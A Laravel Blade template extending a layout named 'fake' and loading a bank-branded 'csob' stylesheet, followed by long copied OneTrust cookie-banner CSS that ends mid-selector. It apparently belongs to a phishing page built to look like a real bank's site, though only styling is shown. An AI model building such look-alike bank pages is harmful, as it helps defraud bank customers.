@extends('layouts.fake')
@push('css')
    <style>
        body{background-color: inherit}
    </style>
    <link href="{{asset('css/csob.css')}}" rel="stylesheet">
    <style>
        #onetrust-banner-sdk .onetrust-vendors-list-handler {
            cursor: pointer;
            color: #1f96db;
            font-size: inherit;
            font-weight: bold;
            text-decoration: none;
            margin-left: 5px
        }

        #onetrust-banner-sdk .onetrust-vendors-list-handler:hover {
            color: #1f96db
        }

        #onetrust-banner-sdk {
            -ms-text-size-adjust: 100%;
            -webkit-text-size-adjust: 100%
        }

        #onetrust-banner-sdk:focus {
            outline: 2px solid #000;
            outline-offset: -2px
        }

        #onetrust-banner-sdk a:focus {
            outline: 2px solid #000
        }

        #onetrust-banner-sdk .ot-close-icon,
        #onetrust-pc-sdk .ot-close-icon,
        #ot-sync-ntfy .ot-close-icon {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4IiB3aWR0aD0iMzQ4LjMzM3B4IiBoZWlnaHQ9IjM0OC4zMzNweCIgdmlld0JveD0iMCAwIDM0OC4zMzMgMzQ4LjMzNCIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzQ4LjMzMyAzNDguMzM0OyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PGc+PHBhdGggZmlsbD0iIzU2NTY1NiIgZD0iTTMzNi41NTksNjguNjExTDIzMS4wMTYsMTc0LjE2NWwxMDUuNTQzLDEwNS41NDljMTUuNjk5LDE1LjcwNSwxNS42OTksNDEuMTQ1LDAsNTYuODVjLTcuODQ0LDcuODQ0LTE4LjEyOCwxMS43NjktMjguNDA3LDExLjc2OWMtMTAuMjk2LDAtMjAuNTgxLTMuOTE5LTI4LjQxOS0xMS43NjlMMTc0LjE2NywyMzEuMDAzTDY4LjYwOSwzMzYuNTYzYy03Ljg0Myw3Ljg0NC0xOC4xMjgsMTEuNzY5LTI4LjQxNiwxMS43NjljLTEwLjI4NSwwLTIwLjU2My0zLjkxOS0yOC40MTMtMTEuNzY5Yy0xNS42OTktMTUuNjk4LTE1LjY5OS00MS4xMzksMC01Ni44NWwxMDUuNTQtMTA1LjU0OUwxMS43NzQsNjguNjExYy0xNS42OTktMTUuNjk5LTE1LjY5OS00MS4xNDUsMC01Ni44NDRjMTUuNjk2LTE1LjY4Nyw0MS4xMjctMTUuNjg3LDU2LjgyOSwwbDEwNS41NjMsMTA1LjU1NEwyNzkuNzIxLDExLjc2N2MxNS43MDUtMTUuNjg3LDQxLjEzOS0xNS42ODcsNTYuODMyLDBDMzUyLjI1OCwyNy40NjYsMzUyLjI1OCw1Mi45MTIsMzM2LjU1OSw2OC42MTF6Ii8+PC9nPjwvc3ZnPg==");
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            height: 12px;
            width: 12px
        }

        #onetrust-banner-sdk .powered-by-logo,
        #onetrust-banner-sdk .ot-pc-footer-logo a,
        #onetrust-pc-sdk .powered-by-logo,
        #onetrust-pc-sdk .ot-pc-footer-logo a,
        #ot-sync-ntfy .powered-by-logo,
        #ot-sync-ntfy .ot-pc-footer-logo a {
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            height: 25px;
            width: 152px;
            display: block
        }

        #onetrust-banner-sdk h3 *,
        #onetrust-banner-sdk h4 *,
        #onetrust-banner-sdk h6 *,
        #onetrust-banner-sdk button *,
        #onetrust-banner-sdk a[data-parent-id] *,
        #onetrust-pc-sdk h3 *,
        #onetrust-pc-sdk h4 *,
        #onetrust-pc-sdk h6 *,
        #onetrust-pc-sdk button *,
        #onetrust-pc-sdk a[data-parent-id] *,
        #ot-sync-ntfy h3 *,
        #ot-sync-ntfy h4 *,
        #ot-sync-ntfy h6 *,
        #ot-sync-ntfy button *,
        #ot-sync-ntfy a[data-parent-id] * {
            font-size: inherit;
            font-weight: inherit;
            color: inherit
        }

        #onetrust-banner-sdk .ot-hide,
        #onetrust-pc-sdk .ot-hide,
        #ot-sync-ntfy .ot-hide {
            display: none !important
        }

        #onetrust-pc-sdk .ot-sdk-row .ot-sdk-column {
            padding: 0
        }

        #onetrust-pc-sdk .ot-sdk-container {
            padding-right: 0
        }

        #onetrust-pc-sdk .ot-sdk-row {
            flex-direction: initial;
            width: 100%
        }

        #onetrust-pc-sdk [type="checkbox"]:checked,
        #onetrust-pc-sdk [type="checkbox"]:not(:checked) {
            pointer-events: initial
        }

        #onetrust-pc-sdk [type="checkbox"]:disabled+label::before,
        #onetrust-pc-sdk [type="checkbox"]:disabled+label:after,
        #onetrust-pc-sdk [type="checkbox"]:disabled+label {
            pointer-events: none;
            opacity: 0.7
        }

        #onetrust-pc-sdk #vendor-list-content {
            transform: translate3d(0, 0, 0)
        }

        #onetrust-pc-sdk li input[type="checkbox"] {
            z-index: 1
        }

        #onetrust-pc-sdk li .ot-checkbox label {
            z-index: 2
        }

        #onetrust-pc-sdk li .ot-checkbox input[type="checkbox"] {
            height: auto;
            width: auto
        }

        #onetrust-pc-sdk li .host-title a,
        #onetrust-pc-sdk li .ot-host-name a,
        #onetrust-pc-sdk li .accordion-text,
        #onetrust-pc-sdk li .ot-acc-txt {
            z-index: 2;
            position: relative
        }

        #onetrust-pc-sdk input {
            margin: 3px 0.1ex
        }

        #onetrust-pc-sdk .pc-logo,
        #onetrust-pc-sdk .ot-pc-logo {
            height: 60px;
            width: 180px;
            background-position: center;
            background-size: contain;
            background-repeat: no-repeat
        }

        #onetrust-pc-sdk .screen-reader-only,
        #onetrust-pc-sdk .ot-scrn-rdr,
        .ot-sdk-cookie-policy .screen-reader-only,
        .ot-sdk-cookie-policy .ot-scrn-rdr {
            border: 0;
            clip: rect(0 0 0 0);
            height: 1px;
            margin: -1px;
            overflow: hidden;
            padding: 0;
            position: absolute;
            width: 1px
        }

        #onetrust-pc-sdk.ot-fade-in,
        .onetrust-pc-dark-filter.ot-fade-in,
        #onetrust-banner-sdk.ot-fade-in {
            animation-name: onetrust-fade-in;
            animation-duration: 400ms;
            animation-timing-function: ease-in-out
        }

        #onetrust-pc-sdk.ot-hide {
            display: none !important
        }

        .onetrust-pc-dark-filter.ot-hide {
            display: none !important
        }

        #ot-sdk-btn.ot-sdk-show-settings,
        #ot-sdk-btn.optanon-show-settings {
            color: #68b631;
            border: 1px solid #68b631;
            height: auto;
            white-space: normal;
            word-wrap: break-word;
            padding: 0.8em 2em;
            font-size: 0.8em;
            line-height: 1.2;
            cursor: pointer;
            -moz-transition: 0.1s ease;
            -o-transition: 0.1s ease;
            -webkit-transition: 1s ease;
            transition: 0.1s ease
        }

        #ot-sdk-btn.ot-sdk-show-settings:hover,
        #ot-sdk-btn.optanon-show-settings:hover {
            color: #fff;
            background-color: #68b631
        }

        .onetrust-pc-dark-filter {
            background: rgba(0, 0, 0, 0.5);
            z-index: 2147483646;
            width: 100%;
            height: 100%;
            overflow: hidden;
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0
        }

        @keyframes onetrust-fade-in {
            0% {
                opacity: 0
            }
            100% {
                opacity: 1
            }
        }

        .ot-cookie-label {
            text-decoration: underline
        }

        @media only screen and (min-width: 426px) and (max-width: 896px) and (orientation: landscape) {
            #onetrust-pc-sdk p {
                font-size: 0.75em
            }
        }

        #onetrust-banner-sdk .banner-option-input:focus+label {
            outline: 1px solid #000;
            outline-style: auto
        }

        .category-vendors-list-handler+a:focus,
        .category-vendors-list-handler+a:focus-visible {
            outline: 2px solid #000
        }

        #onetrust-banner-sdk,
        #onetrust-pc-sdk,
        #ot-sdk-cookie-policy,
        #ot-sync-ntfy {
            font-size: 16px
        }

        #onetrust-banner-sdk *,
        #onetrust-banner-sdk::after,
        #onetrust-banner-sdk::before,
        #onetrust-pc-sdk *,
        #onetrust-pc-sdk::after,
        #onetrust-pc-sdk::before,
        #ot-sdk-cookie-policy *,
        #ot-sdk-cookie-policy::after,
        #ot-sdk-cookie-policy::before,
        #ot-sync-ntfy *,
        #ot-sync-ntfy::after,
        #ot-sync-ntfy::before {
            -webkit-box-sizing: content-box;
            -moz-box-sizing: content-box;
            box-sizing: content-box
        }

        #onetrust-banner-sdk div,
        #onetrust-banner-sdk span,
        #onetrust-banner-sdk h1,
        #onetrust-banner-sdk h2,
        #onetrust-banner-sdk h3,
        #onetrust-banner-sdk h4,
        #onetrust-banner-sdk h5,
        #onetrust-banner-sdk h6,
        #onetrust-banner-sdk p,
        #onetrust-banner-sdk img,
        #onetrust-banner-sdk svg,
        #onetrust-banner-sdk button,
        #onetrust-banner-sdk section,
        #onetrust-banner-sdk a,
        #onetrust-banner-sdk label,
        #onetrust-banner-sdk input,
        #onetrust-banner-sdk ul,
        #onetrust-banner-sdk li,
        #onetrust-banner-sdk nav,
        #onetrust-banner-sdk table,
        #onetrust-banner-sdk thead,
        #onetrust-banner-sdk tr,
        #onetrust-banner-sdk td,
        #onetrust-banner-sdk tbody,
        #onetrust-banner-sdk .ot-main-content,
        #onetrust-banner-sdk .ot-toggle,
        #onetrust-banner-sdk #ot-content,
        #onetrust-banner-sdk #ot-pc-content,
        #onetrust-banner-sdk .checkbox,
        #onetrust-pc-sdk div,
        #onetrust-pc-sdk span,
        #onetrust-pc-sdk h1,
        #onetrust-pc-sdk h2,
        #onetrust-pc-sdk h3,
        #onetrust-pc-sdk h4,
        #onetrust-pc-sdk h5,
        #onetrust-pc-sdk h6,
        #onetrust-pc-sdk p,
        #onetrust-pc-sdk img,
        #onetrust-pc-sdk svg,
        #onetrust-pc-sdk button,
        #onetrust-pc-sdk section,
        #onetrust-pc-sdk a,
        #onetrust-pc-sdk label,
        #onetrust-pc-sdk input,
        #onetrust-pc-sdk ul,
        #onetrust-pc-sdk li,
        #onetrust-pc-sdk nav,
        #onetrust-pc-sdk table,
        #onetrust-pc-sdk thead,
        #onetrust-pc-sdk tr,
        #onetrust-pc-sdk td,
        #onetrust-pc-sdk tbody,
        #onetrust-pc-sdk .ot-main-content,
        #onetrust-pc-sdk .ot-toggle,
        #onetrust-pc-sdk #ot-content,
        #onetrust-pc-sdk #ot-pc-content,
        #onetrust-pc-sdk .checkbox,
        #ot-sdk-cookie-policy div,
        #ot-sdk-cookie-policy span,
        #ot-sdk-cookie-policy h1,
        #ot-sdk-cookie-policy h2,
        #ot-sdk-cookie-policy h3,
        #ot-sdk-cookie-policy h4,
        #ot-sdk-cookie-policy h5,
        #ot-sdk-cookie-policy h6,
        #ot-sdk-cookie-policy p,
        #ot-sdk-cookie-policy img,
        #ot-sdk-cookie-policy svg,
        #ot-sdk-cookie-policy button,
        #ot-sdk-cookie-policy section,
        #ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy label,
        #ot-sdk-cookie-policy input,
        #ot-sdk-cookie-policy ul,
        #ot-sdk-cookie-policy li,
        #ot-sdk-cookie-policy nav,
        #ot-sdk-cookie-policy table,
        #ot-sdk-cookie-policy thead,
        #ot-sdk-cookie-policy tr,
        #ot-sdk-cookie-policy td,
        #ot-sdk-cookie-policy tbody,
        #ot-sdk-cookie-policy .ot-main-content,
        #ot-sdk-cookie-policy .ot-toggle,
        #ot-sdk-cookie-policy #ot-content,
        #ot-sdk-cookie-policy #ot-pc-content,
        #ot-sdk-cookie-policy .checkbox,
        #ot-sync-ntfy div,
        #ot-sync-ntfy span,
        #ot-sync-ntfy h1,
        #ot-sync-ntfy h2,
        #ot-sync-ntfy h3,
        #ot-sync-ntfy h4,
        #ot-sync-ntfy h5,
        #ot-sync-ntfy h6,
        #ot-sync-ntfy p,
        #ot-sync-ntfy img,
        #ot-sync-ntfy svg,
        #ot-sync-ntfy button,
        #ot-sync-ntfy section,
        #ot-sync-ntfy a,
        #ot-sync-ntfy label,
        #ot-sync-ntfy input,
        #ot-sync-ntfy ul,
        #ot-sync-ntfy li,
        #ot-sync-ntfy nav,
        #ot-sync-ntfy table,
        #ot-sync-ntfy thead,
        #ot-sync-ntfy tr,
        #ot-sync-ntfy td,
        #ot-sync-ntfy tbody,
        #ot-sync-ntfy .ot-main-content,
        #ot-sync-ntfy .ot-toggle,
        #ot-sync-ntfy #ot-content,
        #ot-sync-ntfy #ot-pc-content,
        #ot-sync-ntfy .checkbox {
            font-family: inherit;
            font-weight: normal;
            -webkit-font-smoothing: auto;
            letter-spacing: normal;
            line-height: normal;
            padding: 0;
            margin: 0;
            height: auto;
            min-height: 0;
            max-height: none;
            width: auto;
            min-width: 0;
            max-width: none;
            border-radius: 0;
            border: none;
            clear: none;
            float: none;
            position: static;
            bottom: auto;
            left: auto;
            right: auto;
            top: auto;
            text-align: left;
            text-decoration: none;
            text-indent: 0;
            text-shadow: none;
            text-transform: none;
            white-space: normal;
            background: none;
            overflow: visible;
            vertical-align: baseline;
            visibility: visible;
            z-index: auto;
            box-shadow: none
        }

        #onetrust-banner-sdk label:before,
        #onetrust-banner-sdk label:after,
        #onetrust-banner-sdk .checkbox:after,
        #onetrust-banner-sdk .checkbox:before,
        #onetrust-pc-sdk label:before,
        #onetrust-pc-sdk label:after,
        #onetrust-pc-sdk .checkbox:after,
        #onetrust-pc-sdk .checkbox:before,
        #ot-sdk-cookie-policy label:before,
        #ot-sdk-cookie-policy label:after,
        #ot-sdk-cookie-policy .checkbox:after,
        #ot-sdk-cookie-policy .checkbox:before,
        #ot-sync-ntfy label:before,
        #ot-sync-ntfy label:after,
        #ot-sync-ntfy .checkbox:after,
        #ot-sync-ntfy .checkbox:before {
            content: "";
            content: none
        }

        #onetrust-banner-sdk .ot-sdk-container,
        #onetrust-pc-sdk .ot-sdk-container,
        #ot-sdk-cookie-policy .ot-sdk-container {
            position: relative;
            width: 100%;
            max-width: 100%;
            margin: 0 auto;
            padding: 0 20px;
            box-sizing: border-box
        }

        #onetrust-banner-sdk .ot-sdk-column,
        #onetrust-banner-sdk .ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-column,
        #onetrust-pc-sdk .ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-column,
        #ot-sdk-cookie-policy .ot-sdk-columns {
            width: 100%;
            float: left;
            box-sizing: border-box;
            padding: 0;
            display: initial
        }

        @media (min-width: 400px) {
            #onetrust-banner-sdk .ot-sdk-container,
            #onetrust-pc-sdk .ot-sdk-container,
            #ot-sdk-cookie-policy .ot-sdk-container {
                width: 90%;
                padding: 0
            }
        }

        @media (min-width: 550px) {
            #onetrust-banner-sdk .ot-sdk-container,
            #onetrust-pc-sdk .ot-sdk-container,
            #ot-sdk-cookie-policy .ot-sdk-container {
                width: 100%
            }
            #onetrust-banner-sdk .ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-columns {
                margin-left: 4%
            }
            #onetrust-banner-sdk .ot-sdk-column:first-child,
            #onetrust-banner-sdk .ot-sdk-columns:first-child,
            #onetrust-pc-sdk .ot-sdk-column:first-child,
            #onetrust-pc-sdk .ot-sdk-columns:first-child,
            #ot-sdk-cookie-policy .ot-sdk-column:first-child,
            #ot-sdk-cookie-policy .ot-sdk-columns:first-child {
                margin-left: 0
            }
            #onetrust-banner-sdk .ot-sdk-two.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-two.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-two.ot-sdk-columns {
                width: 13.3333333333%
            }
            #onetrust-banner-sdk .ot-sdk-three.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-three.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-three.ot-sdk-columns {
                width: 22%
            }
            #onetrust-banner-sdk .ot-sdk-four.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-four.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-four.ot-sdk-columns {
                width: 30.6666666667%
            }
            #onetrust-banner-sdk .ot-sdk-eight.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-eight.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-eight.ot-sdk-columns {
                width: 65.3333333333%
            }
            #onetrust-banner-sdk .ot-sdk-nine.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-nine.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-nine.ot-sdk-columns {
                width: 74%
            }
            #onetrust-banner-sdk .ot-sdk-ten.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-ten.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-ten.ot-sdk-columns {
                width: 82.6666666667%
            }
            #onetrust-banner-sdk .ot-sdk-eleven.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-eleven.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-eleven.ot-sdk-columns {
                width: 91.3333333333%
            }
            #onetrust-banner-sdk .ot-sdk-twelve.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-twelve.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-twelve.ot-sdk-columns {
                width: 100%;
                margin-left: 0
            }
        }

        #onetrust-banner-sdk h1,
        #onetrust-banner-sdk h2,
        #onetrust-banner-sdk h3,
        #onetrust-banner-sdk h4,
        #onetrust-banner-sdk h5,
        #onetrust-banner-sdk h6,
        #onetrust-pc-sdk h1,
        #onetrust-pc-sdk h2,
        #onetrust-pc-sdk h3,
        #onetrust-pc-sdk h4,
        #onetrust-pc-sdk h5,
        #onetrust-pc-sdk h6,
        #ot-sdk-cookie-policy h1,
        #ot-sdk-cookie-policy h2,
        #ot-sdk-cookie-policy h3,
        #ot-sdk-cookie-policy h4,
        #ot-sdk-cookie-policy h5,
        #ot-sdk-cookie-policy h6 {
            margin-top: 0;
            font-weight: 600;
            font-family: inherit
        }

        #onetrust-banner-sdk h1,
        #onetrust-pc-sdk h1,
        #ot-sdk-cookie-policy h1 {
            font-size: 1.5rem;
            line-height: 1.2
        }

        #onetrust-banner-sdk h2,
        #onetrust-pc-sdk h2,
        #ot-sdk-cookie-policy h2 {
            font-size: 1.5rem;
            line-height: 1.25
        }

        #onetrust-banner-sdk h3,
        #onetrust-pc-sdk h3,
        #ot-sdk-cookie-policy h3 {
            font-size: 1.5rem;
            line-height: 1.3
        }

        #onetrust-banner-sdk h4,
        #onetrust-pc-sdk h4,
        #ot-sdk-cookie-policy h4 {
            font-size: 1.5rem;
            line-height: 1.35
        }

        #onetrust-banner-sdk h5,
        #onetrust-pc-sdk h5,
        #ot-sdk-cookie-policy h5 {
            font-size: 1.5rem;
            line-height: 1.5
        }

        #onetrust-banner-sdk h6,
        #onetrust-pc-sdk h6,
        #ot-sdk-cookie-policy h6 {
            font-size: 1.5rem;
            line-height: 1.6
        }

        @media (min-width: 550px) {
            #onetrust-banner-sdk h1,
            #onetrust-pc-sdk h1,
            #ot-sdk-cookie-policy h1 {
                font-size: 1.5rem
            }
            #onetrust-banner-sdk h2,
            #onetrust-pc-sdk h2,
            #ot-sdk-cookie-policy h2 {
                font-size: 1.5rem
            }
            #onetrust-banner-sdk h3,
            #onetrust-pc-sdk h3,
            #ot-sdk-cookie-policy h3 {
                font-size: 1.5rem
            }
            #onetrust-banner-sdk h4,
            #onetrust-pc-sdk h4,
            #ot-sdk-cookie-policy h4 {
                font-size: 1.5rem
            }
            #onetrust-banner-sdk h5,
            #onetrust-pc-sdk h5,
            #ot-sdk-cookie-policy h5 {
                font-size: 1.5rem
            }
            #onetrust-banner-sdk h6,
            #onetrust-pc-sdk h6,
            #ot-sdk-cookie-policy h6 {
                font-size: 1.5rem
            }
        }

        #onetrust-banner-sdk p,
        #onetrust-pc-sdk p,
        #ot-sdk-cookie-policy p {
            margin: 0 0 1em 0;
            font-family: inherit;
            line-height: normal
        }

        #onetrust-banner-sdk a,
        #onetrust-pc-sdk a,
        #ot-sdk-cookie-policy a {
            color: #565656;
            text-decoration: underline
        }

        #onetrust-banner-sdk a:hover,
        #onetrust-pc-sdk a:hover,
        #ot-sdk-cookie-policy a:hover {
            color: #565656;
            text-decoration: none
        }

        #onetrust-banner-sdk .ot-sdk-button,
        #onetrust-banner-sdk button,
        #onetrust-pc-sdk .ot-sdk-button,
        #onetrust-pc-sdk button,
        #ot-sdk-cookie-policy .ot-sdk-button,
        #ot-sdk-cookie-policy button {
            margin-bottom: 1rem;
            font-family: inherit
        }

        #onetrust-banner-sdk .ot-sdk-button,
        #onetrust-banner-sdk button,
        #onetrust-pc-sdk .ot-sdk-button,
        #onetrust-pc-sdk button,
        #ot-sdk-cookie-policy .ot-sdk-button,
        #ot-sdk-cookie-policy button {
            display: inline-block;
            height: 38px;
            padding: 0 30px;
            color: #555;
            text-align: center;
            font-size: 0.9em;
            font-weight: 400;
            line-height: 38px;
            letter-spacing: 0.01em;
            text-decoration: none;
            white-space: nowrap;
            background-color: transparent;
            border-radius: 2px;
            border: 1px solid #bbb;
            cursor: pointer;
            box-sizing: border-box
        }

        #onetrust-banner-sdk .ot-sdk-button:hover,
        #onetrust-banner-sdk:not(.ot-leg-btn-container)>button:hover,
        #onetrust-banner-sdk:not(.ot-leg-btn-container)>button:focus,
        #onetrust-pc-sdk .ot-sdk-button:hover,
        #onetrust-pc-sdk:not(.ot-leg-btn-container)>button:hover,
        #onetrust-pc-sdk:not(.ot-leg-btn-container)>button:focus,
        #ot-sdk-cookie-policy .ot-sdk-button:hover,
        #ot-sdk-cookie-policy:not(.ot-leg-btn-container)>button:hover,
        #ot-sdk-cookie-policy:not(.ot-leg-btn-container)>button:focus {
            color: #333;
            border-color: #888;
            opacity: 0.7
        }

        #onetrust-banner-sdk .ot-sdk-button:focus,
        #onetrust-banner-sdk:not(.ot-leg-btn-container)>button:focus,
        #onetrust-pc-sdk .ot-sdk-button:focus,
        #onetrust-pc-sdk:not(.ot-leg-btn-container)>button:focus,
        #ot-sdk-cookie-policy .ot-sdk-button:focus,
        #ot-sdk-cookie-policy:not(.ot-leg-btn-container)>button:focus {
            outline: 2px solid #000
        }

        #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary,
        #onetrust-banner-sdk button.ot-sdk-button-primary,
        #onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary,
        #onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary,
        #onetrust-banner-sdk input[type="button"].ot-sdk-button-primary,
        #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary,
        #onetrust-pc-sdk button.ot-sdk-button-primary,
        #onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary,
        #onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary,
        #onetrust-pc-sdk input[type="button"].ot-sdk-button-primary,
        #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary,
        #ot-sdk-cookie-policy button.ot-sdk-button-primary,
        #ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary,
        #ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary,
        #ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary {
            color: #fff;
            background-color: #33c3f0;
            border-color: #33c3f0
        }

        #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:hover,
        #onetrust-banner-sdk button.ot-sdk-button-primary:hover,
        #onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary:hover,
        #onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary:hover,
        #onetrust-banner-sdk input[type="button"].ot-sdk-button-primary:hover,
        #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:focus,
        #onetrust-banner-sdk button.ot-sdk-button-primary:focus,
        #onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary:focus,
        #onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary:focus,
        #onetrust-banner-sdk input[type="button"].ot-sdk-button-primary:focus,
        #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:hover,
        #onetrust-pc-sdk button.ot-sdk-button-primary:hover,
        #onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary:hover,
        #onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary:hover,
        #onetrust-pc-sdk input[type="button"].ot-sdk-button-primary:hover,
        #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:focus,
        #onetrust-pc-sdk button.ot-sdk-button-primary:focus,
        #onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary:focus,
        #onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary:focus,
        #onetrust-pc-sdk input[type="button"].ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy button.ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary:hover,
        #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy button.ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary:focus,
        #ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary:focus {
            color: #fff;
            background-color: #1eaedb;
            border-color: #1eaedb
        }

        #onetrust-banner-sdk input[type="text"],
        #onetrust-pc-sdk input[type="text"],
        #ot-sdk-cookie-policy input[type="text"] {
            height: 38px;
            padding: 6px 10px;
            background-color: #fff;
            border: 1px solid #d1d1d1;
            border-radius: 4px;
            box-shadow: none;
            box-sizing: border-box
        }

        #onetrust-banner-sdk input[type="text"],
        #onetrust-pc-sdk input[type="text"],
        #ot-sdk-cookie-policy input[type="text"] {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none
        }

        #onetrust-banner-sdk input[type="text"]:focus,
        #onetrust-pc-sdk input[type="text"]:focus,
        #ot-sdk-cookie-policy input[type="text"]:focus {
            border: 1px solid #000;
            outline: 0
        }

        #onetrust-banner-sdk label,
        #onetrust-pc-sdk label,
        #ot-sdk-cookie-policy label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600
        }

        #onetrust-banner-sdk input[type="checkbox"],
        #onetrust-pc-sdk input[type="checkbox"],
        #ot-sdk-cookie-policy input[type="checkbox"] {
            display: inline
        }

        #onetrust-banner-sdk ul,
        #onetrust-pc-sdk ul,
        #ot-sdk-cookie-policy ul {
            list-style: circle inside
        }

        #onetrust-banner-sdk ul,
        #onetrust-pc-sdk ul,
        #ot-sdk-cookie-policy ul {
            padding-left: 0;
            margin-top: 0
        }

        #onetrust-banner-sdk ul ul,
        #onetrust-pc-sdk ul ul,
        #ot-sdk-cookie-policy ul ul {
            margin: 1.5rem 0 1.5rem 3rem;
            font-size: 90%
        }

        #onetrust-banner-sdk li,
        #onetrust-pc-sdk li,
        #ot-sdk-cookie-policy li {
            margin-bottom: 1rem
        }

        #onetrust-banner-sdk th,
        #onetrust-banner-sdk td,
        #onetrust-pc-sdk th,
        #onetrust-pc-sdk td,
        #ot-sdk-cookie-policy th,
        #ot-sdk-cookie-policy td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #e1e1e1
        }

        #onetrust-banner-sdk button,
        #onetrust-pc-sdk button,
        #ot-sdk-cookie-policy button {
            margin-bottom: 1rem;
            font-family: inherit
        }

        #onetrust-banner-sdk .ot-sdk-container:after,
        #onetrust-banner-sdk .ot-sdk-row:after,
        #onetrust-pc-sdk .ot-sdk-container:after,
        #onetrust-pc-sdk .ot-sdk-row:after,
        #ot-sdk-cookie-policy .ot-sdk-container:after,
        #ot-sdk-cookie-policy .ot-sdk-row:after {
            content: "";
            display: table;
            clear: both
        }

        #onetrust-banner-sdk .ot-sdk-row,
        #onetrust-pc-sdk .ot-sdk-row,
        #ot-sdk-cookie-policy .ot-sdk-row {
            margin: 0;
            max-width: none;
            display: block
        }

        #onetrust-banner-sdk {
            box-shadow: 0 0 18px rgba(0, 0, 0, .2)
        }

        #onetrust-banner-sdk.otCenterRounded {
            z-index: 2147483645;
            top: 10%;
            position: fixed;
            right: 0;
            background-color: #fff;
            width: 60%;
            max-width: 650px;
            border-radius: 2.5px;
            left: 1em;
            margin: 0 auto;
            font-size: 14px;
            max-height: 90%;
            overflow-x: hidden;
            overflow-y: auto
        }

        #onetrust-banner-sdk.otRelFont {
            font-size: .875rem
        }

        #onetrust-banner-sdk::-webkit-scrollbar {
            width: 11px
        }

        #onetrust-banner-sdk::-webkit-scrollbar-thumb {
            border-radius: 10px;
            background: #c1c1c1
        }

        #onetrust-banner-sdk {
            scrollbar-arrow-color: #c1c1c1;
            scrollbar-darkshadow-color: #c1c1c1;
            scrollbar-face-color: #c1c1c1;
            scrollbar-shadow-color: #c1c1c1
        }

        #onetrust-banner-sdk h3,
        #onetrust-banner-sdk p {
            color: dimgray
        }

        #onetrust-banner-sdk #onetrust-policy {
            margin-top: 20px
        }

        #onetrust-banner-sdk #onetrust-policy-title {
            float: left;
            text-align: left;
            font-size: 1em;
            line-height: 1.4;
            margin-bottom: 0;
            padding: 0 0 10px 30px;
            width: calc(100% - 90px)
        }

        #onetrust-banner-sdk #onetrust-policy-text,
        #onetrust-banner-sdk .ot-b-addl-desc,
        #onetrust-banner-sdk .ot-gv-list-handler {
            clear: both;
            float: left;
            margin: 0 30px 10px 30px;
            font-size: .813em;
            line-height: 1.5
        }

        #onetrust-banner-sdk #onetrust-policy-text *,
